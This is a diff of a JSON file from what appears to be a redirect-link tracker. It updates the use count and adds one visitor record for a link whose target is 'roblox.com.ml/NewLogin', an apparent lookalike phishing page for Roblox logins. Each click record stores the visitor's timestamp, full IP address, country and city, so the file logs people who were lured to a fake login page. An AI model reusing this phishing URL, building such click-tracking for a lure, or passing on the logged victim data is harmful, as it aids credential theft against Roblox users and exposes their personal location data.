@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 219,
+    "useCount": 220,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1864,6 +1864,14 @@
         "city": "Marion",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1776983205662,
+        "ip": "181.137.103.144",
+        "country": "Colombia",
+        "city": "Armenia",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
       }
     ]
   },
